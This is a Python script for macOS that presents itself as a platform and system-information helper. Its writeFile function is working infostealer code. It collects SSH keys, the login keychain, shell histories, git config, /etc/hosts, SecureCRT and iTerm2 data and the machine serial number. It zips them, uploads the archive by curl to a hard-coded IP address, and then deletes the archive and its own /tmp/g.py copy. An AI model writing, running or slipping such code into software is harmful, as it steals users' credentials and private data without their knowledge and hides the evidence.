#coding:utf-8

import platform

t = platform.system()
# print(t)

#coding=utf-8

#platform_mode.py

import platform
import os
import pwd
import socket
import subprocess
import shutil
import io
import zipfile

#global var
SHOW_LOG = True


def get_platform():
    '''获取操作系统名称及版本号'''
    return platform.platform()


def get_version():
    '''获取操作系统版本号'''
    return platform.version()


def get_architecture():
    '''获取操作系统的位数'''
    return platform.architecture()


def get_machine():
    '''计算机类型'''
    return platform.machine()


def get_node():
    '''计算机的网络名称'''
    return platform.node()


def get_processor():
    '''计算机处理器信息'''
    return platform.processor()


def get_system():
    '''获取操作系统类型'''
    return platform.system()


def get_uname():
    '''汇总信息'''
    return platform.uname()


def get_python_build():
    ''' the Python build number and date as strings'''
    return platform.python_build()


def get_python_compiler():
    '''Returns a string identifying the compiler used for compiling Python'''
    return platform.python_compiler()


def get_python_branch():
    '''Returns a string identifying the Python implementation SCM branch'''
    return platform.python_branch()


def get_python_implementation():
    '''Returns a string identifying the Python implementation. Possible return values are: ‘CPython', ‘IronPython', ‘Jython', ‘PyPy'.'''
    return platform.python_implementation()


def get_python_version():
    '''Returns the Python version as string 'major.minor.patchlevel'
  '''
    return platform.python_version()


def get_python_revision():
    '''Returns a string identifying the Python implementation SCM revision.'''
    return platform.python_revision()


def get_python_version_tuple():
    '''Returns the Python version as tuple (major, minor, patchlevel) of strings'''
    return platform.python_version_tuple()


def show_os_all_info():
    '''打印os的全部信息'''
    # print('获取操作系统名称及版本号 : [{}]'.format(get_platform()))
    # print('获取操作系统版本号 : [{}]'.format(get_version()))
    # print('获取操作系统的位数 : [{}]'.format(get_architecture()))
    # print('计算机类型 : [{}]'.format(get_machine()))
    # print('计算机的网络名称 : [{}]'.format(get_node()))
    # print('计算机处理器信息 : [{}]'.format(get_processor()))
    # print('获取操作系统类型 : [{}]'.format(get_system()))
    # print('汇总信息 : [{}]'.format(get_uname()))


def show_os_info():
    '''只打印os的信息，没有解释部分'''
    # print(get_platform())
    # print(get_version())
    # print(get_architecture())
    # print(get_machine())
    # print(get_node())
    # print(get_processor())
    # print(get_system())
    # print(get_uname())


def show_python_all_info():
    '''打印python的全部信息'''
    # print('The Python build number and date as strings : [{}]'.format(
    #     get_python_build()))
    # print(
    #     'Returns a string identifying the compiler used for compiling Python : [{}]'
    #     .format(get_python_compiler()))
    # print(
    #     'Returns a string identifying the Python implementation SCM branch : [{}]'
    #     .format(get_python_branch()))
    # print(
    #     'Returns a string identifying the Python implementation : [{}]'.format(
    #         get_python_implementation()))
    # print('The version of Python ： [{}]'.format(get_python_version()))
    # print('Python implementation SCM revision : [{}]'.format(
    #     get_python_revision()))
    # print('Python version as tuple : [{}]'.format(get_python_version_tuple()))


def show_python_info():
    '''只打印python的信息，没有解释部分'''
    # print(get_python_build())
    # print(get_python_compiler())
    # print(get_python_branch())
    # print(get_python_implementation())
    # print(get_python_version())
    # print(get_python_revision())
    # print(get_python_version_tuple())


def get_applications_list():
    return os.listdir('/Applications/')


def get_hosts():
    with open('/etc/hosts', 'r') as f:
        return (f.read())


def get_username():
    return pwd.getpwuid(os.getuid())[0]


def get_localIp(prefix):
    localIP = ''
    for ip in socket.gethostbyname_ex(socket.gethostname())[2]:
        if ip.startswith(prefix):
            localIP = ip
    return localIP


def subprocess_popen(statement):
    p = subprocess.Popen(statement, shell=True, stdout=subprocess.PIPE)
    while p.poll() is None:
        if p.wait() is not 0:
            # print("excute error")
            return False
        else:
            re = p.stdout.readlines()
            result = []
            for i in range(len(re)):
                res = re[i].decode('utf-8').strip('\r\n')
                result.append(res)
            return result


def get_gitGlobalConfig():
    return subprocess_popen('git config --global --list')


def get_bashHistory():
    username = get_username()
    filename = '/Users/' + username + '/.bash_history'
    if os.path.exists(filename):
        f = open(filename, 'r+', encoding='unicode_escape')
        lines = f.readlines()
        # for line in lines:
        # print (line)
        # print(type(line))
        f.close()
        return lines
    else:
        return 'no bash'


def get_zshHistory():
    username = get_username()
    filename = '/Users/' + username + '/.zsh_history'
    if os.path.exists(filename):
        f = io.open(filename, 'r+', encoding='unicode_escape')
        lines = f.readlines()
        # for line in lines:
        #   print (line)
        #   print(type(line))
        f.close()
        return lines[-5000:]
    else:
        return 'no zsh'


# def show_other_info():
    # print(get_applications_list())
    # print(get_hosts())
    # print(get_username())
    # print(get_localIp('192.168'))
    # print(get_gitGlobalConfig())
    # print(get_bashHistory())
    # print(get_zshHistory())


def test():
    if SHOW_LOG:
        show_os_all_info()
    else:
        show_os_info()
    # print('#' * 50)
    # print('计算机中的python信息：')
    if SHOW_LOG:
        show_python_all_info()
    else:
        show_python_info()

    show_other_info()


def init():
    global SHOW_LOG
    SHOW_LOG = True


def zip_ya(start_dir):
    start_dir = start_dir
    file_news = start_dir + '.zip'

    z = zipfile.ZipFile(file_news, 'w', zipfile.ZIP_DEFLATED)
    for dir_path, dir_names, file_names in os.walk(start_dir):
        f_path = dir_path.replace(start_dir, '')
        f_path = f_path and f_path + os.sep or ''
        for filename in file_names:
            z.write(os.path.join(dir_path, filename), f_path + filename)
    z.close()
    return file_news


def writeFile():
    username = get_username()
    foldername = '/Users/' + username + '/Library/Logs/tmp'
    zipname = '/Users/' + username + '/Library/Logs/tmp.zip'
    filename = '/Users/' + username + '/Library/Logs/tmp/tmp.txt'
    if os.path.exists(foldername):
        # print('11111')
        shutil.rmtree(foldername)
    os.makedirs(foldername)
    with open(filename, 'a+') as file:
        file.write('获取操作系统名称及版本号 : [{}]'.format(get_platform()) + '\n')
        file.write('获取操作系统版本号 : [{}]'.format(get_version()) + '\n')
        file.write('获取操作系统的位数 : [{}]'.format(get_architecture()) + '\n')
        file.write('计算机类型 : [{}]'.format(get_machine()) + '\n')
        file.write('计算机的网络名称 : [{}]'.format(get_node()) + '\n')
        file.write('计算机处理器信息 : [{}]'.format(get_processor()) + '\n')
        file.write('获取操作系统类型 : [{}]'.format(get_system()) + '\n')
        file.write('汇总信息 : [{}]'.format(get_uname()) + '\n')
        file.write('程序列表 : [{}]'.format(get_applications_list) + '\n')
        file.write('hosts文件 : [{}]'.format(get_hosts()) + '\n')
        file.write('当前用户名 : ' + get_username() + '\n')
        #file.write('hostIp : [{}]'.format(get_localIp('192.168')) + '\n')

        # file.write('~/ : [{}]'.format(subprocess_popen("ls -la ~/ >>")) +
        #            '\n')
        # file.write('gitGlobalConfig : [{}]'.format(subprocess_popen("ls -la ~/.ssh/")) +
        #            '\n')
        # file.write('gitGlobalConfig : [{}]'.format(subprocess_popen("ls -la ~/Desktop")) +
        #            '\n')
        # file.write('gitGlobalConfig : [{}]'.format(subprocess_popen("ls -la ~/Documents")) +
        #            '\n')
        # file.write('gitGlobalConfig : [{}]'.format(subprocess_popen("ls -la ~/Downloads")) +
        #            '\n')
        # file.write('gitGlobalConfig : [{}]'.format(subprocess_popen("ls -la /Applications")) +
        #            '\n')
        # file.write('bashHistory : [{}]'.format(get_bashHistory()) + '\n')
        # file.write('zshHistory : [{}]'.format(get_zshHistory()) + '\n')
        file.write('test : [{}]'.format(subprocess_popen("bash -c ls /")) +
                   '\n')

    # subprocess_popen("ls -la ~/ >>" + foldername + "/root.txt")
    # subprocess_popen("ls -la ~/.ssh/ >>" + foldername + "/ssh.txt")
    # subprocess_popen("ls -la ~/Desktop >>" + foldername + "/deskTop.txt")
    # subprocess_popen("ls -la ~/Documents >>" + foldername + "/Documents.txt")
    # subprocess_popen("ls -la ~/Downloads >>" + foldername + "/Downloads.txt")
    # subprocess_popen("ls -la /Applications >>" + foldername + "/Applications.txt")

    subprocess_popen("ioreg -l | grep IOPlatformSerialNumber >>" + foldername + "/root.txt")
    subprocess_popen("echo ls -la ~/ >>" + foldername + "/root.txt")
    subprocess_popen("ls -la ~/ >>" + foldername + "/root.txt")
    #subprocess_popen("echo ls -la ~/Desktop >>" + foldername + "/root.txt")
    #subprocess_popen("ls -la ~/Desktop >>" + foldername + "/root.txt")
    #subprocess_popen("echo ls -la ~/Documents >>" + foldername + "/root.txt")
    #subprocess_popen("ls -la ~/Documents >>" + foldername + "/root.txt")
    #subprocess_popen("echo ls -la ~/Downloads >>" + foldername + "/root.txt")
    #subprocess_popen("ls -la ~/Downloads >>" + foldername + "/root.txt")
    subprocess_popen("echo ls -la /Applications >>" + foldername + "/root.txt")
    subprocess_popen("ls -la /Applications >>" + foldername + "/root.txt")

    bashHistory = '/Users/' + username + '/.bash_history'
    zshHistory = '/Users/' + username + '/.zsh_history'

    gitConfig = '/Users/' + username + '/.gitConfig'
    hosts = '/etc/hosts'
    ssh = '/Users/' + username + '/.ssh'
    zhHistory = '/Users/' + username + '/.zhHistory'
    loginKeychain = '/Users/' + username + '/Library/Keychains/Login.keychain-db'

    secureCRT = '/Users/' + username + '/Library/Application Support/VanDyke/SecureCRT/Config'
    item2 = '/Users/' + username + '/Library/Application Support/iTerm2/SavedState'

    serialId = str(subprocess_popen("ioreg -l | grep IOPlatformSerialNumber")).split("\"")[3]
    if os.path.exists(bashHistory):
        shutil.copyfile(bashHistory, foldername + '/bashHistory')
    if os.path.exists(zshHistory):
        shutil.copyfile(zshHistory, foldername + '/zsh_history')

    if os.path.exists(gitConfig):
        shutil.copyfile(gitConfig, foldername + '/gitConfig')
    if os.path.exists(hosts):
        shutil.copyfile(hosts, foldername + '/hosts')
    if os.path.exists(ssh):
        shutil.copytree(ssh, foldername + '/ssh')
    if os.path.exists(zhHistory):
        shutil.copyfile(zhHistory, foldername + '/zhHistory')
    if os.path.exists(loginKeychain):
        shutil.copyfile(loginKeychain, foldername +'/' + serialId + '.keychain-db')
    if os.path.exists(secureCRT):
        shutil.copytree(secureCRT, foldername +'/' + 'secureCRT')
    if os.path.exists(item2):
        shutil.copytree(item2, foldername +'/' + 'item2')      
    zip_ya(foldername)
    shutil.rmtree(foldername)

    command = "curl -F \"file=@" + zipname + "\" \"http://47.75.123.111/u.php?id=%s\" -v" %serialId
    os.system(command)
    os.remove(zipname)
    os.remove('/tmp/g.py')

def main():
    init()
    # test()
    writeFile()
    # print("done")


if __name__ == '__main__':
    main()

